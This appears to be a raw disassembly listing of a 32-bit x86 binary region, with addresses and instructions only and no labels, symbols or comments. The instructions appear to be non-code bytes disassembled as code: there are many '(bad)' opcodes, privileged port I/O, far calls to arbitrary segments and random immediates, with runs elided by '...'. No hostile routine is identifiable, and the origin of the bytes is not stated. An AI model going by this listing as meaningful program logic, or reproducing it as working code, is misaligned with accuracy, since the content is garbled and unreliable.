  41e111:	xchg   esp,eax
  41e112:	outs   dx,DWORD PTR ds:[esi]
  41e113:	gs xor eax,0x3a673e2e
  41e119:	ins    DWORD PTR es:[edi],dx
  41e11a:	je     0x41e156
  41e11c:	ja     0x41e0aa
  41e11e:	imul   edi,DWORD PTR [edx+0x3e],0x63
  41e122:	ins    BYTE PTR es:[edi],dx
  41e123:	popa   
  41e124:	nop
  41e125:	xor    eax,0x2177302b
  41e12a:	pusha  
  41e12b:	outs   dx,DWORD PTR ds:[esi]
  41e12c:	xor    cl,BYTE PTR [edi+0x793e745d]
  41e132:	ins    BYTE PTR es:[edi],dx
  41e133:	gs in  al,dx
  41e135:	cmp    BYTE PTR [edx+0x53],cl
  41e138:	out    dx,al
  41e139:	test   DWORD PTR [eax],esp
  41e13b:	xor    eax,0x20384f31
  41e140:	fsub   DWORD PTR [ecx+0x6e]
  41e143:	shl    BYTE PTR fs:[edi+0x6f],1
  41e147:	and    BYTE PTR [esi],bh
  41e149:	aaa    
  41e14a:	es or  eax,0x74e0d
  41e150:	inc    ecx
  41e151:	pop    edi
  41e152:	cs add BYTE PTR cs:[eax],al
	...
  41e17e:	out    0x9c,eax
  41e180:	sub    ch,BYTE PTR [esi]
  41e182:	or     eax,0xd2e2a59
  41e187:	pop    ecx
  41e188:	dec    eax
  41e189:	push   edi
  41e18a:	ds sti 
  41e18c:	cmp    al,0x0
  41e18e:	push   ebp
  41e18f:	pop    ds
  41e190:	icebp  
  41e191:	aaa    
  41e192:	data16 das 
  41e194:	fisubr WORD PTR [edi]
  41e196:	or     bh,dl
  41e198:	aad    0x22
  41e19a:	outs   dx,BYTE PTR ds:[esi]
  41e19b:	push   es
  41e19c:	dec    ecx
  41e19d:	sub    ebx,DWORD PTR [ebx+0x2]
  41e1a0:	out    dx,eax
  41e1a1:	push   edi
  41e1a2:	arpl   WORD PTR [edx-0x2a],sp
  41e1a5:	push   edi
  41e1a6:	push   ebx
  41e1a7:	pop    edi
  41e1a8:	aam    0x31
  41e1aa:	not    BYTE PTR [esi-0x2c]
  41e1ad:	xor    esi,esi
  41e1af:	pop    esi
  41e1b0:	aam    0x31
  41e1b2:	out    0x56,al
  41e1b4:	aam    0x31
  41e1b6:	out    0x5e,al
  41e1b8:	aam    0x31
  41e1ba:	push   ss
  41e1bb:	push   edi
  41e1bc:	aam    0x31
  41e1be:	push   ss
  41e1bf:	ja     0x41e1c5
  41e1c1:	inc    ebp
  41e1c2:	jecxz  0x41e229
  41e1c4:	push   edx
  41e1c5:	pop    edi
  41e1c6:	jmp    0x156a:0xed631a6a
  41e1cd:	je     0x41e1aa
  41e1cf:	inc    esi
  41e1d0:	dec    esp
  41e1d1:	outs   dx,BYTE PTR ds:[esi]
  41e1d2:	loopne 0x41e240
  41e1d4:	add    al,0x69
  41e1d6:	fstp   TBYTE PTR [edi]
  41e1d8:	das    
  41e1d9:	arpl   WORD PTR [edx-0x65d22cff],bp
  41e1df:	inc    esi
  41e1e0:	sub    eax,0x0
	...
  41e209:	add    BYTE PTR [eax],al
  41e20b:	add    BYTE PTR [edi+0x21],dh
  41e20e:	cmp    ch,BYTE PTR [ebp-0x57]
  41e211:	ins    BYTE PTR es:[edi],dx
  41e212:	fmul   DWORD PTR [edi-0x74]
  41e215:	sbb    eax,0x218d6326
  41e21a:	add    DWORD PTR [ecx-0x67],edx
  41e21d:	adc    al,0x15
  41e21f:	jne    0x41e1c0
  41e221:	add    BYTE PTR [eax],ch
  41e223:	pop    esp
  41e224:	adc    BYTE PTR [ebx],0x13
  41e227:	pop    esp
  41e228:	mov    es,WORD PTR [esi]
  41e22a:	sbb    BYTE PTR [ebp+0x57],ah
  41e22d:	pop    ebx
  41e22e:	xchg   ebp,eax
  41e22f:	push   ss
  41e230:	sbb    BYTE PTR [ebp-0x6c85cc4d],0x86
  41e237:	push   ss
  41e238:	dec    edx
  41e239:	enter  0x36e7,0x5b
  41e23d:	mov    ebp,0xc9611a7b
  41e242:	test   BYTE PTR [edi],bh
  41e244:	add    BYTE PTR [edx-0x54ea2a87],bh
  41e24a:	jnp    0x41e264
  41e24c:	and    esi,DWORD PTR [edx-0x62fde8ab]
  41e252:	xor    esi,DWORD PTR [edx+edi*8]
  41e255:	xchg   edx,eax
  41e256:	inc    esi
  41e257:	pop    ss
  41e258:	or     cl,al
  41e25a:	out    0x36,eax
  41e25c:	sbb    edi,DWORD PTR [ebp-0x371ee4c5]
  41e262:	inc    esp
  41e263:	inc    eax
  41e264:	add    BYTE PTR [edx-0x45fb1bc7],bh
  41e26a:	cmp    eax,0x19bde325
  41e26f:	inc    eax
	...
  41e298:	add    BYTE PTR [eax],al
  41e29a:	push   cs
  41e29b:	mov    bh,0x14
  41e29d:	sub    esp,ecx
  41e29f:	mov    ah,0x1a
  41e2a1:	inc    eax
  41e2a2:	clc    
  41e2a3:	scas   al,BYTE PTR es:[edi]
  41e2a4:	aaa    
  41e2a5:	inc    eax
  41e2a6:	div    BYTE PTR [ebx+0x5acf17fa]
  41e2ac:	sbb    dh,BYTE PTR [ebx]
  41e2ae:	mov    al,ds:0xac24fec7
  41e2b3:	mov    eax,0xcd894a0b
  41e2b8:	ret    
  41e2b9:	ss or  ecx,0xb48227c4
  41e2c0:	enter  0xa32f,0xba
  41e2c4:	lahf   
  41e2c5:	sub    al,0x8f
  41e2c7:	(bad)  
  41e2c8:	(bad)  
  41e2c9:	adc    eax,0x37a59f89
  41e2ce:	mov    ss,WORD PTR [ebx-0x38b73a00]
  41e2d4:	add    BYTE PTR [edx-0x618b46d4],bl
  41e2da:	sbb    cl,ch
  41e2dc:	arpl   WORD PTR [ebp-0x248d5d79],di
  41e2e2:	adc    DWORD PTR [edi+ebx*2+0x44b71697],ebp
  41e2e9:	nop
  41e2ea:	sbb    ch,BYTE PTR [edi-0x45fa7993]
  41e2f0:	jno    0x41e36f
  41e2f2:	ins    BYTE PTR es:[edi],dx
  41e2f3:	int    0x77
  41e2f5:	(bad)  
  41e2f6:	mul    DWORD PTR [esi-0x3390ceb0]
  41e2fc:	je     0x41e2e7
	...
  41e326:	add    BYTE PTR [eax],al
  41e328:	push   edx
  41e329:	mov    al,0x66
  41e32b:	pop    ebp
  41e32c:	aaa    
  41e32d:	mov    ds:0x98fe4472,al
  41e332:	pop    edi
  41e333:	cmp    ebx,DWORD PTR [edx+0x1d4f5f95]
  41e339:	mov    eax,0xabfe3b63
  41e33e:	pop    edi
  41e33f:	aaa    
  41e340:	and    DWORD PTR [edi-0x50e2efbc],esi
  41e346:	ins    DWORD PTR es:[edi],dx
  41e347:	push   es
  41e348:	or     bh,BYTE PTR [edx-0x32f0e28f]
  41e34e:	ja     0x41e37d
  41e350:	hlt    
  41e351:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e352:	push   eax
  41e353:	xor    DWORD PTR [edi],ecx
  41e355:	int3   
  41e356:	je     0x41e341
  41e358:	ins    DWORD PTR es:[edi],dx
  41e359:	mov    ds:0xb056fa71,al
  41e35e:	jb     0x41e365
  41e360:	inc    edx
  41e361:	xchg   ebx,eax
  41e362:	ins    DWORD PTR es:[edi],dx
  41e363:	fimul  DWORD PTR [ecx-0x6f]
  41e366:	pop    edi
  41e367:	int3   
  41e368:	pusha  
  41e369:	pop    ebx
  41e36a:	push   ebx
  41e36b:	ficomp DWORD PTR [eax-0x33]
  41e36e:	add    BYTE PTR [ebp+0x63b154],bl
  41e374:	pop    ss
  41e375:	arpl   WORD PTR [edi+0x78],bx
  41e378:	fdiv   DWORD PTR [ebx+0x74]
  41e37b:	jo     0x41e3b6
  41e37d:	jbe    0x41e3ed
  41e37f:	imul   edx,edi,0xae484381
  41e385:	xchg   BYTE PTR [ebp+eax*2-0x6b],cl
  41e389:	pop    ebp
  41e38a:	inc    ebp
  41e38b:	outs   dx,BYTE PTR ds:[esi]
	...
  41e3b4:	add    BYTE PTR [eax],al
  41e3b6:	mov    ah,0x69
  41e3b8:	pop    ebp
  41e3b9:	ins    BYTE PTR es:[edi],dx
  41e3ba:	dec    ebx
  41e3bb:	call   0x7074:0x93d77265
  41e3c2:	out    dx,al
  41e3c3:	mov    esp,DWORD PTR [ebp+0x4e]
  41e3c6:	(bad)  
  41e3c7:	jo     0x41e42a
  41e3c9:	add    ah,al
  41e3cb:	mov    ah,BYTE PTR [esi+0x74]
  41e3ce:	add    BYTE PTR [esi+0x72],bh
  41e3d1:	gs pop ebx
  41e3d3:	xchg   esp,eax
  41e3d4:	push   0x618af469
  41e3d9:	jb     0x41e436
  41e3db:	test   BYTE PTR [ebp+0x6e],ah
  41e3de:	repz mov esi,DWORD PTR [ebx+0x73]
  41e3e2:	inc    edi
  41e3e3:	cwde   
  41e3e4:	imul   ebp,DWORD PTR [ebp-0x6],0x7d
  41e3e8:	outs   dx,BYTE PTR ds:[esi]
  41e3e9:	add    ch,BYTE PTR fs:[ecx+0x0]
  41e3ed:	push   ebx
  41e3ee:	dec    eax
  41e3ef:	jne    0x41e465
  41e3f1:	ja     0x41e439
  41e3f3:	imul   esp,DWORD PTR [ecx+0x5c],0x73656f20
  41e3fa:	dec    ebx
  41e3fb:	js     0x41e46f
  41e3fd:	pop    esp
  41e3fe:	and    ecx,DWORD PTR [esp+esi*2+0x40374b61]
  41e405:	outs   dx,DWORD PTR ds:[esi]
  41e406:	cmp    dh,BYTE PTR [eax+0x5d]
  41e409:	outs   dx,BYTE PTR ds:[esi]
  41e40a:	inc    ebx
  41e40b:	js     0x41e47f
  41e40d:	add    bl,bh
  41e40f:	xchg   ebp,eax
  41e410:	jo     0x41e485
  41e412:	lock jne 0x41e489
  41e415:	arpl   WORD PTR [esi],di
  41e417:	sbb    al,BYTE PTR [ecx]
  41e419:	push   ecx
	...
  41e442:	add    BYTE PTR [eax],al
  41e444:	xchg   edi,eax
  41e445:	es es jno 0x41e4ab
  41e449:	xor    bh,BYTE PTR ds:0x18056e47
  41e44f:	addr16 push 0x15
  41e452:	sub    DWORD PTR [ecx+edx*4-0x1b],ebx
  41e456:	aas    
  41e457:	inc    esi
  41e458:	mov    al,BYTE PTR [edx]
  41e45a:	add    DWORD PTR [ecx+edx*2-0x15],ebx
  41e45e:	cs fsubr DWORD PTR cs:[bx+di]
  41e463:	add    BYTE PTR [eax],bl
  41e465:	fld    TBYTE PTR [esi]
  41e467:	addr16 ds loope 0x41e49e
  41e46b:	pop    ebp
  41e46c:	add    dh,ah
  41e46e:	xor    BYTE PTR [eax],al
  41e470:	cli    
  41e471:	cli    
  41e472:	xor    al,BYTE PTR [eax]
  41e474:	add    dh,bh
  41e476:	inc    esi
  41e477:	inc    esp
  41e478:	test   DWORD PTR [ebx-0x7a0cbefc],0x81ea4647
  41e482:	add    al,0x4f
  41e484:	std    
  41e485:	jns    0x41e4b2
  41e487:	jno    0x41e493
  41e489:	test   eax,0x653e7712
  41e48e:	sub    eax,0x2380ea66
  41e493:	jb     0x41e478
  41e495:	dec    ebp
  41e496:	inc    ebp
  41e497:	ins    BYTE PTR es:[edi],dx
  41e498:	rcl    DWORD PTR [ebx+0x23],1
  41e49b:	ins    BYTE PTR es:[edi],dx
  41e49c:	in     eax,dx
  41e49d:	je     0x41e4e2
  41e49f:	push   eax
  41e4a0:	sti    
  41e4a1:	test   DWORD PTR [ecx+0x73],eax
  41e4a4:	rcl    BYTE PTR [esi+0x46],cl
  41e4a7:	push   esp
	...
  41e4d0:	add    BYTE PTR [eax],al
  41e4d2:	out    dx,al
  41e4d3:	adc    ebx,edx
  41e4d5:	pop    ds
  41e4d6:	xchg   BYTE PTR [ecx+0x2f],dl
  41e4d9:	arpl   WORD PTR [edx-0x66abbe9d],dx
  41e4df:	inc    ecx
  41e4e0:	sub    eax,0xd95b9f62
  41e4e5:	add    ebp,DWORD PTR [edi-0x50]
  41e4e8:	lds    edx,FWORD PTR [edi]
  41e4ea:	mov    edi,DWORD PTR [edx-0x6795d727]
  41e4f0:	mov    ebx,0xd3ba9c2e
  41e4f5:	xor    bh,BYTE PTR [edi-0x66]
  41e4f8:	xchg   edi,eax
  41e4f9:	dec    eax
  41e4fa:	xchg   edx,eax
  41e4fb:	pushf  
  41e4fc:	mov    esp,0x93995d17
  41e501:	xor    ebx,DWORD PTR [esi]
  41e503:	mov    edi,eax
  41e505:	xor    ecx,DWORD PTR [eax+esi*4-0x7b]
  41e509:	sub    BYTE PTR [edi-0x34],cl
  41e50c:	sub    BYTE PTR [esi],0x58
  41e50f:	mov    edx,0x9c713f7b
  41e514:	fwait
  41e515:	sub    ebp,DWORD PTR cs:[edi+0x5b2c2489]
  41e51c:	call   0x2c24:0x76c7202e
  41e523:	mov    dh,0x43
  41e525:	inc    edi
  41e526:	sub    dh,BYTE PTR [eax-0x53dddab7]
  41e52c:	sub    al,BYTE PTR [ebp-0x12]
  41e52f:	xchg   ebp,eax
  41e530:	sub    eax,DWORD PTR [ebx+0xd]
  41e533:	(bad)  
  41e534:	dec    esp
  41e535:	inc    esi
	...
  41e55e:	add    BYTE PTR [eax],al
  41e560:	adc    ch,BYTE PTR [ebx-0x6cae28f9]
  41e566:	inc    esi
  41e567:	xor    ebp,ebx
  41e569:	sahf   
  41e56a:	sbb    BYTE PTR [ebx+0xa],al
  41e56d:	mov    al,0x16
  41e56f:	xor    ah,bl
  41e571:	mov    ecx,0xafef0419
  41e576:	or     eax,0x19b9d318
  41e57b:	sub    edx,esp
  41e57d:	xchg   edi,eax
  41e57e:	adc    ebp,DWORD PTR [edi]
  41e580:	pushf  
  41e581:	mov    esp,0x9c7f330b
  41e586:	add    BYTE PTR [ecx],bl
  41e588:	ja     0x41e529
  41e58a:	inc    ecx
  41e58b:	hlt    
  41e58c:	dec    ecx
  41e58d:	mov    edx,0x7b4dbd46
  41e592:	xor    eax,0x6dc94a09
  41e597:	iret   
  41e598:	push   esi
  41e599:	int3   
  41e59a:	jno    0x41e55c
  41e59c:	push   eax
  41e59d:	lods   eax,DWORD PTR ds:[esi]
  41e59e:	pop    edi
  41e59f:	aad    0x39
  41e5a1:	mov    es,WORD PTR [ecx-0x6b]
  41e5a4:	and    BYTE PTR [eax-0x36dd3494],dh
  41e5aa:	add    BYTE PTR [edx-0x618b4af0],bl
  41e5b0:	and    cl,cl
  41e5b2:	arpl   WORD PTR [ebp-0x74925088],di
  41e5b8:	and    ch,BYTE PTR [edi-0x548555af]
  41e5be:	inc    ebx
  41e5bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e5c0:	cld    
  41e5c1:	leave  
  41e5c2:	je     0x41e548
	...
  41e5ec:	add    BYTE PTR [eax],al
  41e5ee:	sti    
  41e5ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e5f0:	push   eax
  41e5f1:	leave  
  41e5f2:	test   DWORD PTR [esi+0x48],ebx
  41e5f5:	jle    0x41e665
  41e5f7:	mov    edx,0xa6ff385c
  41e5fc:	ins    DWORD PTR es:[edi],dx
  41e5fd:	dec    esi
  41e5fe:	dec    esi
  41e5ff:	mov    ecx,0xac425b5f
  41e604:	ins    DWORD PTR es:[edi],dx
  41e605:	inc    edi
  41e606:	es enter 0x3b5f,0x21
  41e60b:	lahf   
  41e60c:	inc    ebp
  41e60d:	dec    ebp
  41e60e:	and    edi,DWORD PTR [ecx-0x63d0baa1]
  41e614:	aas    
  41e615:	sbb    ecx,edi
  41e617:	sahf   
  41e618:	inc    ecx
  41e619:	sbb    al,0x36
  41e61b:	mov    edx,0x7b0a3546
  41e620:	cmp    cl,cl
  41e622:	or     eax,0x19076dc9
  41e627:	int3   
  41e628:	jno    0x41e62a
  41e62a:	dec    esi
  41e62b:	jo     0x41e69b
  41e62d:	popa   
  41e62e:	inc    ebx
  41e62f:	fwait
  41e630:	dec    ebp
  41e631:	inc    ebx
  41e632:	dec    ebx
  41e633:	jo     0x41e6a0
  41e635:	ins    BYTE PTR es:[edi],dx
  41e636:	xor    eax,0x300727a
  41e63b:	xchg   edi,eax
  41e63c:	ins    BYTE PTR es:[edi],dx
  41e63d:	outs   dx,DWORD PTR ds:[esi]
  41e63e:	add    eax,0xd4536c79
  41e643:	cwde   
  41e644:	push   eax
  41e645:	inc    ebp
  41e646:	rcr    DWORD PTR [edx-0x67f58b8f],cl
  41e64c:	push   esp
  41e64d:	push   eax
  41e64e:	out    0x7d,eax
  41e650:	inc    ebx
  41e651:	ins    BYTE PTR es:[edi],dx
	...
  41e67a:	add    BYTE PTR [eax],al
  41e67c:	add    BYTE PTR [ebp+ebx*2+0x6c],bh
  41e680:	les    ebx,FWORD PTR [edx+0x7daa503d]
  41e686:	aas    
  41e687:	jne    0x41e634
  41e689:	je     0x41e6d1
  41e68b:	push   esp
  41e68c:	xchg   DWORD PTR [ecx],edi
  41e68e:	dec    ebp
  41e68f:	jb     0x41e6d1
  41e691:	pop    edx
  41e692:	pop    esp
  41e693:	inc    edi
  41e694:	shr    DWORD PTR [esi+0x62],cl
  41e697:	popa   
  41e698:	ret    
  41e699:	mov    bh,BYTE PTR [edi]
  41e69b:	inc    ecx
  41e69c:	(bad)  
  41e69d:	xchg   esp,eax
  41e69e:	pop    esp
  41e69f:	inc    ebx
  41e6a0:	sub    ah,BYTE PTR [esi+0x61]
  41e6a3:	inc    esi
  41e6a4:	pop    ebx
  41e6a5:	xchg   DWORD PTR [eax],esp
  41e6a7:	dec    esp
  41e6a8:	out    dx,al
  41e6a9:	bound  esp,QWORD PTR [ecx+0x0]
  41e6ac:	push   ebx
  41e6ad:	pushf  
  41e6ae:	jno    0x41e724
  41e6b0:	cli    
  41e6b1:	xchg   esp,eax
  41e6b2:	push   esp
  41e6b3:	push   eax
  41e6b4:	addr16 jge 0x41e726
  41e6b7:	ins    DWORD PTR es:[edi],dx
  41e6b8:	inc    ecx
  41e6b9:	jae    0x41e718
  41e6bb:	je     0x41e714
  41e6bd:	mov    ch,BYTE PTR [ebx+0x66]
  41e6c0:	sub    ebp,DWORD PTR [eax+0x5d]
  41e6c3:	jb     0x41e70f
  41e6c5:	fwait
  41e6c6:	inc    esi
  41e6c7:	ins    BYTE PTR es:[edi],dx
  41e6c8:	inc    esi
  41e6c9:	ins    BYTE PTR es:[edi],dx
  41e6ca:	push   0x348c3e46
  41e6cf:	pop    esp
  41e6d0:	or     eax,0xa06d3034
  41e6d5:	ds adc al,0x5f
  41e6d8:	lods   al,BYTE PTR ds:[esi]
  41e6d9:	push   edi
  41e6da:	inc    eax
  41e6db:	inc    esi
  41e6dc:	call   0x0:0x680f53
	...
  41e707:	add    BYTE PTR [eax],al
  41e709:	add    BYTE PTR [eax+0x6a],bh
  41e70c:	xor    al,0x0
  41e70e:	ins    DWORD PTR es:[edi],dx
  41e70f:	and    eax,0x13897423
  41e714:	packsswb mm5,QWORD PTR [edx-0x14]
  41e718:	sub    al,0x5f
  41e71a:	lea    ebx,[edx]
  41e71c:	inc    ebx
  41e71d:	pop    eax
  41e71e:	mov    ?,esi
  41e720:	aam    0xff
  41e722:	xchg   BYTE PTR [eax+edx*1],cl
  41e725:	je     0x41e786
  41e727:	push   ss
  41e728:	sub    eax,0x21f66c63
  41e72d:	je     0x41e795
  41e72f:	add    ah,BYTE PTR [edx]
  41e731:	je     0x41e799
  41e733:	xor    dl,BYTE PTR [ecx]
  41e735:	pop    edi
  41e736:	push   edx
  41e737:	fiadd  DWORD PTR [eax]
  41e739:	inc    edi
  41e73a:	push   eax
  41e73b:	loope  0x41e751
  41e73d:	pop    edi
  41e73e:	sub    ah,dh
  41e740:	loopne 0x41e791
  41e742:	pop    ds
  41e743:	(bad)  
  41e744:	sub    DWORD PTR [eax],eax
  41e746:	add    dl,bl
  41e748:	adc    al,0x5f
  41e74a:	clc    
  41e74b:	mov    esp,0xa023642d
  41e750:	add    al,0x5c
  41e752:	in     eax,dx
  41e753:	stos   BYTE PTR es:[edi],al
  41e754:	adc    BYTE PTR [ebx+0xd],ah
  41e757:	push   esp
  41e758:	and    BYTE PTR [edi+0xa],bl
  41e75b:	xor    dh,BYTE PTR ds:0x25aaf34f
  41e761:	imul   esp,DWORD PTR [eax],0x3e742396
  41e767:	dec    sp
  41e769:	addr16 in eax,dx
  41e76b:	test   DWORD PTR [ecx],ebp
  41e76d:	jb     0x41e76f
	...
  41e797:	add    bh,dl
  41e799:	pop    edx
  41e79a:	aad    0x1f
  41e79c:	icebp  
  41e79d:	(bad)  
  41e79e:	out    0x37,eax
  41e7a0:	add    BYTE PTR [edi-0x6b29e8f8],ch
  41e7a6:	das    
  41e7a7:	xor    al,0x9a
  41e7a9:	mov    bh,ah
  41e7ab:	aaa    
  41e7ac:	js     0x41e75d
  41e7ae:	or     BYTE PTR [edi],dl
  41e7b0:	xchg   esi,eax
  41e7b1:	xchg   ebp,eax
  41e7b2:	sysenter 
  41e7b4:	add    BYTE PTR [edi-0x4d7fc819],0xd3
  41e7bb:	and    BYTE PTR [edx+esi*4-0x35],dh
  41e7bf:	daa    
  41e7c0:	imul   ebx,DWORD PTR [ebx-0x4d],0xc4c79916
  41e7c7:	sub    BYTE PTR [ecx+0x5d22c8ad],bl
  41e7cd:	leave  
  41e7ce:	or     eax,0xe7af551c
  41e7d3:	aaa    
  41e7d4:	ins    BYTE PTR es:[edi],dx
  41e7d5:	mov    dh,0xca
  41e7d7:	and    BYTE PTR [eax-0x39],ch
  41e7da:	call   0x4f15:0x84c54c20
  41e7e1:	ins    DWORD PTR es:[edi],dx
  41e7e2:	(bad)
  41e7e6:	stos   DWORD PTR es:[edi],eax
  41e7e7:	and    DWORD PTR [ecx],esp
  41e7e9:	scas   eax,DWORD PTR es:[edi]
  41e7ea:	mov    WORD PTR ds:0x248baf19,ds
  41e7f0:	pop    eax
  41e7f1:	ret    
  41e7f2:	test   BYTE PTR [edi],ah
  41e7f4:	ds test al,0x7e
  41e7f7:	and    DWORD PTR [edx],edx
  41e7f9:	les    ecx,FWORD PTR [eax+0x16]
	...
  41e824:	add    BYTE PTR [eax],al
  41e826:	sbb    eax,0x1a2d259f
  41e82b:	mov    dh,0x31
  41e82d:	sub    eax,0x448af12
  41e832:	shrd   DWORD PTR [ebp+0x10],ecx,0xeb
  41e837:	mov    ecx,0x950a2139
  41e83c:	add    BYTE PTR [eax+0x16],al
  41e83f:	mov    eax,0xaf26405a
  41e844:	pop    edi
  41e845:	leave  
  41e846:	clc    
  41e847:	scas   al,BYTE PTR es:[edi]
  41e848:	addr16 add al,0x14
  41e84b:	mov    DWORD PTR [eax],0x74ca1420
  41e851:	or     BYTE PTR [esi-0x39],ah
  41e854:	pop    ebp
  41e855:	sub    eax,0x3100ad63
  41e85a:	push   ebp
  41e85b:	lods   al,BYTE PTR ds:[esi]
  41e85c:	je     0x41e847
  41e85e:	outs   dx,BYTE PTR ds:[esi]
  41e85f:	lods   al,BYTE PTR ds:[esi]
  41e860:	arpl   bx,di
  41e862:	cmp    eax,0x28da5f8b
  41e867:	pop    ebx
  41e868:	push   eax
  41e869:	into   
  41e86a:	xor    ebp,DWORD PTR [edi-0x39a14500]
  41e870:	ins    DWORD PTR es:[edi],dx
  41e871:	aad    0x1e
  41e873:	jnp    0x41e8b9
  41e875:	ror    BYTE PTR [ebx+0x5b],1
  41e878:	push   ecx
  41e879:	les    edx,FWORD PTR [ebx-0x4f]
  41e87c:	arpl   WORD PTR [ebx-0x46887123],di
  41e882:	push   ds
  41e883:	pop    ebx
  41e884:	push   ecx
  41e885:	mov    WORD PTR [ebx],gs
  41e887:	mov    cl,0x63
  41e889:	fwait
	...
  41e8b2:	add    BYTE PTR [eax],al
  41e8b4:	xlat   BYTE PTR ds:[ebx]
  41e8b5:	mov    ds:0x5b319a6d,al
  41e8ba:	push   ecx
  41e8bb:	test   BYTE PTR [ebx-0x4f],dl
  41e8be:	arpl   WORD PTR [ebx-0x59],di
  41e8c1:	lea    esi,[ecx-0x7c]
  41e8c4:	push   ebx
  41e8c5:	pop    ebx
  41e8c6:	push   ecx
  41e8c7:	mov    WORD PTR [ebx-0x4f],cs
  41e8ca:	arpl   WORD PTR [ebx-0x59],di
  41e8cd:	stos   BYTE PTR es:[edi],al
  41e8ce:	pop    edi
  41e8cf:	pop    edx
  41e8d0:	sub    ebx,DWORD PTR [ebx+0x51]
  41e8d3:	inc    esp
  41e8d4:	xor    BYTE PTR [ecx-0x556ba49d],dh
  41e8da:	ins    DWORD PTR es:[edi],dx
  41e8db:	pop    ebx
  41e8dc:	dec    esi
  41e8dd:	pop    ebx
  41e8de:	push   eax
  41e8df:	add    BYTE PTR [esi],al
  41e8e1:	dec    ebx
  41e8e2:	push   0x725a4400
  41e8e7:	jbe    0x41e8db
  41e8e9:	push   eax
  41e8ea:	push   esp
  41e8eb:	jns    0x41e904
  41e8ed:	pop    edx
  41e8ee:	add    BYTE PTR [esi+eax*2+0x50],cl
  41e8f2:	je     0x41e914
  41e8f4:	add    al,0x5a
  41e8f6:	jb     0x41e96e
  41e8f8:	xor    dl,BYTE PTR [ecx+0x20]
  41e8fb:	dec    eax
  41e8fc:	cmp    BYTE PTR [edi+0x74],cl
  41e8ff:	add    BYTE PTR [ebx+0x7e],ch
  41e902:	outs   dx,DWORD PTR ds:[esi]
  41e903:	je     0x41e8fc
  41e905:	outs   dx,BYTE PTR ds:[esi]
  41e906:	popa   
  41e907:	jb     0x41e92a
  41e909:	pop    ecx
  41e90a:	jb     0x41e92c
  41e90c:	xor    dl,BYTE PTR [eax+0x61]
  41e90f:	jb     0x41e938
  41e911:	mov    ds:0x3df3735d,al
  41e916:	push   eax
  41e917:	add    BYTE PTR gs:[eax],al
	...
  41e942:	in     eax,0x4b
  41e944:	popa   
  41e945:	jb     0x41e98e
  41e947:	outs   dx,DWORD PTR ds:[esi]
  41e948:	pop    ebp
  41e949:	jae    0x41e8ff
  41e94b:	pop    ebp
  41e94c:	dec    esp
  41e94d:	popa   
  41e94e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e94f:	imul   esp,DWORD PTR [eax],0x764ff253
  41e955:	gs xchg ebp,eax
  41e957:	cmp    eax,0x69b56f4d
  41e95c:	add    BYTE PTR [esi+esi*4+0x4e],cl
  41e960:	je     0x41e982
  41e962:	test   BYTE PTR [eax+0x72],bl
  41e965:	jbe    0x41e929
  41e967:	dec    edi
  41e968:	and    BYTE PTR [eax-0x3a],dl
  41e96b:	imul   ebp,DWORD PTR [eax+0x0],0x746f7cdb
  41e972:	ja     0x41e9e2
  41e974:	popa   
  41e975:	jb     0x41e988
  41e977:	pop    ecx
  41e978:	jb     0x41e99a
  41e97a:	push   ebx
  41e97b:	push   esi
  41e97c:	jo     0x41e9e3
  41e97e:	xchg   edi,eax
  41e97f:	fwait
  41e980:	push   esp
  41e981:	push   eax
  41e982:	ds fs dec edx
  41e985:	pop    edi
  41e986:	lock call 0x16:0x90ea5f1f
  41e98e:	add    BYTE PTR [eax+0x34],dl
  41e991:	and    ch,bh
  41e993:	mov    al,ds:0x79df6b25
  41e998:	and    BYTE PTR [ebx-0x34],ah
  41e99b:	inc    ebx
  41e99c:	pop    ds
  41e99d:	je     0x41e96d
  41e99f:	sub    DWORD PTR [bx+di-0x36],esi
  41e9a3:	and    DWORD PTR ds:0x78,ecx
	...
  41e9cd:	add    BYTE PTR [eax],al
  41e9cf:	add    BYTE PTR [edx-0x54bdcabe],dh
  41e9d5:	dec    esi
  41e9d6:	sub    BYTE PTR [ebx-0x4e],ah
  41e9d9:	push   edx
  41e9da:	push   ss
  41e9db:	ins    DWORD PTR es:[edi],dx
  41e9dc:	xchg   ecx,eax
  41e9dd:	push   0x60a950e4
  41e9e2:	adc    BYTE PTR [ebp-0x61],dh
  41e9e5:	adc    al,0x1e
  41e9e7:	add    BYTE PTR [eax+0x1e],bl
  41e9ea:	and    dh,BYTE PTR [esi+edi*1+0x60]
  41e9ee:	es jo  0x41ea5e
  41e9f1:	inc    edx
  41e9f2:	xor    al,0x6d
  41e9f4:	pop    eax
  41e9f5:	test   BYTE PTR [edi],0x5f
  41e9f8:	ins    BYTE PTR es:[edi],dx
  41e9f9:	pop    ds
  41e9fa:	xor    eax,0x2d088e42
  41e9ff:	push   eax
  41ea00:	jp     0x41ea06
  41ea02:	push   cs
  41ea03:	ins    BYTE PTR es:[edi],dx
  41ea04:	(bad)  
  41ea05:	out    0xc,eax
  41ea07:	and    BYTE PTR [esi-0x2c],ch
  41ea0a:	daa    
  41ea0b:	ins    DWORD PTR es:[edi],dx
  41ea0c:	pop    eax
  41ea0d:	and    bh,BYTE PTR [edi]
  41ea0f:	push   esp
  41ea10:	push   cs
  41ea11:	push   es
  41ea12:	inc    esi
  41ea13:	pop    edi
  41ea14:	daa    
  41ea15:	rol    BYTE PTR [eax],1
  41ea17:	push   ecx
  41ea18:	sbb    eax,esp
  41ea1a:	or     al,0x75
  41ea1c:	pop    ds
  41ea1d:	mov    ah,0x1e
  41ea1f:	pop    esp
  41ea20:	cld    
  41ea21:	scas   al,BYTE PTR es:[edi]
  41ea22:	and    eax,0x5b5b1b6c
  41ea27:	xor    al,0xc
  41ea29:	enter  0x1e4e,0x5e
  41ea2d:	mov    WORD PTR [esi+0x1e],es
  41ea30:	repnz scas eax,DWORD PTR es:[edi]
  41ea32:	dec    eax
  41ea33:	adc    al,BYTE PTR [eax]
	...
  41ea5d:	add    ch,bl
  41ea5f:	xchg   esi,eax
  41ea60:	sub    DWORD PTR [ecx],edx
  41ea62:	fcmovb st,st(6)
  41ea64:	inc    esp
  41ea65:	adc    BYTE PTR [esi],cl
  41ea67:	lods   eax,DWORD PTR ds:[esi]
  41ea68:	inc    esi
  41ea69:	daa    
  41ea6a:	loopne 0x41eae6
  41ea6c:	and    eax,0x2a7aee30
  41ea71:	sub    cl,ah
  41ea73:	mov    ebp,0xa5e2100d
